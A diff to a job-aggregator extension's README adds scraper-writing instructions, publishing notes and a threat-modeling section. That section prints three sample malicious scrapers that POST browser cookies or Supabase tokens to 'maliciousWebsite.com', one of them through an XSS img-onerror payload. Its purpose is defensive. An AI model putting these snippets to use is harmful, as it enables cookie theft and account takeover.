@@ -68,7 +68,17 @@ npm run test:e2e -- --debug
 
 ### Lint with [ESLint](https://eslint.org/)
 
-## Expected Job Schema:
+
+## How to write a scraper:
+
+The code must contain a generator function called scrape (not a regular function).
+This generator function may be declared as follows: 
+function *scrape() {
+
+}
+and it may be async.
+
+It may contain other functions as well, but this one is necessary and it is the starting point of any individual scraper. 
 
 ```json
 {
@@ -119,4 +129,79 @@ Without using native-messaging, the other approach would be to use an <input typ
 The obvious downside of the current approach is that it requires the user to install both the extension and native-messaging.
 
 An alternative approach would be to use window.showOpenFilePicker. But this would only work on Google Chrome (and not Firefox). But, it wouldn't require the user to install anything.
+
+
+## Publishing Scrapers
+
+You must create an account before being able to publish your scraper. Published scrapers are available to anyone regardless of whether you have an account or not. I decided to create authentication to only allow logged in users to publish scrapers because otherwise there would be no way to prevent anonymous users from deleting other scrapers unless I force all scrapers to be undeletable even by the owner. 
+
+Currently, the data of whether a scraper is published or unpublished is still stored in IndexedDB. 
+
+I am using Supabase to store the scraper data.
+
+## Dangers of using scrapers
+
+If you were to run the following scraper:
+
+```js
+function *scrape() {
+  const cookies = await browser.cookies.getAll({});
+  fetch('https://maliciousWebsite.com', {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+    },
+    body: JSON.stringify({ cookies }),
+  })
+}
+```
+
+then someone could potentially steal all of your cookies (including http cookies).
+
+The extension is allowed to access http-only cookies since it may be useful at times. If it is possible to display which scrapers do and do not require access to cookies, then that would be a good feature to implement. It may be possible to rewrite scrapers that do happen to use cookies to not use them and get rid of cookie access for the extension.
+
+However, with the app currently using Supabase for authentication, any script (even one that doesn't require the extension to run) could access the data in localstorage (which is where Supabase stores cookies) and gain access to your account (but only for the JobAggregator app). For example:
+
+```js
+function *scrape() {
+  const supabase_cookies = document.localStorage.getItem('sb-...')
+  fetch('https://maliciousWebsite.com', {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+    },
+    body: JSON.stringify({ supabase_cookies }),
+  })
+}
+```
+
+To solve this, I could consider switching to nuxt.js and hosting the site on Vercel. Then Supabase wouldn't store cookies in localstorage.
+
+Finally, another way that you can get your JobAggregator data stolen is through the use of v-html to display job descriptions. Consider the following: 
+
+```js
+function *scrape() {
+  yield {
+    description: `<img src=x onerror="fetch('https://maliciousWebsite.com', {
+      method: 'POST',
+      body: localStorage.getItem('sb-...')
+    })">`
+  }
+}
+```
+
+is this
+```js
+<a v-if="selectedJob.applyLink" :href="selectedJob.applyLink"
+   :target="selectedJob.applyLink.startsWith('javascript:') ? '_self' : '_blank'"
+```
+also a potential threat?
+
+To solve this issue I can try to sanitize the html that is being displayed in v-html.
+
+The last two approaches could only steal JobAggregator data. The first approach could steal data from any website.
+
+
+
+
 
